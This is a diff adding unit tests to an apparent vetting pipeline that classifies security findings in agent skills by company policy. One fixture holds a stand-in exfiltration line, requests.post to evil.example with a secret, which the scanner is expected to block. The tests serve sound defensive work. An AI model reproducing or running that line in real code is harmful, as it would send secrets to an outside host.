@@ -14,6 +14,7 @@ from agent_manager.core.sandbox import SandboxConfig, SandboxResult
 from agent_manager.core.vetting import (
     VettingPipeline,
     _check_manifest_policy,
+    _classify_findings,
     _llm_probe_args_safe,
     _load_manifest,
     _normalize_llm_probe_entrypoint,
@@ -440,6 +441,77 @@ class TestVettingPipeline:
         assert result.risk_level == RiskLevel.MALICIOUS
         assert result.scan_report["risk_classification"]["blocking_count"] == 1
         assert result.scan_report["risk_reconciliation"]["llm_downgrade_blocked"] is True
+
+    def test_policy_can_reclassify_data_exfiltration_as_risk(self, skill_dir, monkeypatch):
+        monkeypatch.setattr(
+            "agent_manager.core.vetting._run_scanner",
+            lambda _path, _policy: {
+                "max_severity": "HIGH",
+                "findings": [{
+                    "rule": "E2",
+                    "severity": "HIGH",
+                    "category": "Data Exfiltration",
+                    "title": "Env Variable Harvesting",
+                    "source": "scanner",
+                }],
+                "analyzers_used": ["scanner"],
+            },
+        )
+
+        result, _violations, _name, _desc, _tools = VettingPipeline(
+            CompanyPolicy({
+                "require_sandbox_for_risk": [],
+                "risk_classification": {
+                    "data_exfiltration": "risk",
+                    "supply_chain": "blocking",
+                    "prompt_injection": "risk",
+                    "tool_misuse": "risk",
+                    "network": "risk",
+                    "credential_access": "risk",
+                    "dynamic_execution": "risk",
+                    "excessive_permissions": "risk",
+                    "dependency": "noise",
+                    "runtime": "noise",
+                },
+            })
+        ).vet(skill_dir, SourceInfo(origin=SkillOrigin.LOCAL))
+
+        assert result.risk_level == RiskLevel.SUSPICIOUS
+        assert result.scan_report["risk_classification"]["blocking_count"] == 0
+        assert result.scan_report["risk_classification"]["risk_count"] == 1
+
+    def test_documented_api_example_is_noise(self, default_policy):
+        classification = _classify_findings([{
+            "rule": "E1",
+            "severity": "MEDIUM",
+            "category": "Data Exfiltration",
+            "title": "External Transmission",
+            "message": "https://api.example.com/",
+            "file": "SKILL.md",
+            "source": "skillspector",
+            "code_snippet": 'curl -H "x-api-key: $EXAMPLE_API_KEY" "https://api.example.com/v1/items"',
+        }], default_policy)
+
+        assert classification["blocking_count"] == 0
+        assert classification["risk_count"] == 0
+        assert classification["noise_count"] == 1
+        assert classification["items"][0]["classification"] == "noise"
+        assert classification["items"][0]["classification_key"] == "documented_external_api"
+
+    def test_script_external_transmission_stays_blocking(self, default_policy):
+        classification = _classify_findings([{
+            "rule": "E1",
+            "severity": "MEDIUM",
+            "category": "Data Exfiltration",
+            "title": "External Transmission",
+            "message": "https://evil.example/upload",
+            "file": "scripts/run.py",
+            "source": "skillspector",
+            "code_snippet": 'requests.post("https://evil.example/upload", data=secret)',
+        }], default_policy)
+
+        assert classification["blocking_count"] == 1
+        assert classification["items"][0]["classification"] == "blocking"
 
     def test_sandbox_flags_are_recorded(self, skill_dir, default_policy, monkeypatch):
         class FakeRunner:
